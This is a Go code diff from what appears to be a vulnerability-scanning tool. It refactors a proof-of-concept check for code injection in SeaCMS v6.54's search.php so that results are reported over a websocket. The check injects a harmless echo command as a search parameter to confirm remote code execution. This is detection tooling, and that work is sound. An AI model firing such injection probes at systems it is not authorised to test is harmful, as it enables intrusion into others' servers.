@@ -8,6 +8,7 @@ import (
 	"time"
 
 	"../logger"
+	"github.com/gorilla/websocket"
 )
 
 // SeaCMSv654 search.php code injection.
@@ -21,18 +22,24 @@ func NewSeaCMSv654() *SeaCMSv654 {
 	return &SeaCMSv654{}
 }
 
+// Set implements POC interface.
+// Params should be {target string}
+func (s *SeaCMSv654) Set(v ...interface{}) {
+	s.target = v[0].(string)
+}
+
 // Report implements POC interface.
 func (s *SeaCMSv654) Report() interface{} {
 	return s.Existed
 }
 
 // Run implements POC interface.
-func (s *SeaCMSv654) Run(target string) {
-	s.target = target
-	s.check()
+func (s *SeaCMSv654) Run(conn *websocket.Conn) {
+	logger.Green.Println("Checking SeaCMSv6.54 Vuls...")
+	s.check(conn)
 }
 
-func (s *SeaCMSv654) check() {
+func (s *SeaCMSv654) check(conn *websocket.Conn) {
 	cmd := `?echo"AssassinGooo";`
 	payload := url.Values{}
 	payload.Add("searchtype", "5")
@@ -61,8 +68,13 @@ func (s *SeaCMSv654) check() {
 	body, _ := ioutil.ReadAll(resp.Body)
 	resp.Body.Close()
 	if strings.Contains(string(body), "AssassinGooo") {
-		logger.Blue.Println(s.target)
 		s.Existed = "true"
-		return
+
+		logger.Blue.Println(s.target)
+		ret := map[string]string{
+			"host":    s.target,
+			"existed": s.Existed,
+		}
+		conn.WriteJSON(ret)
 	}
 }
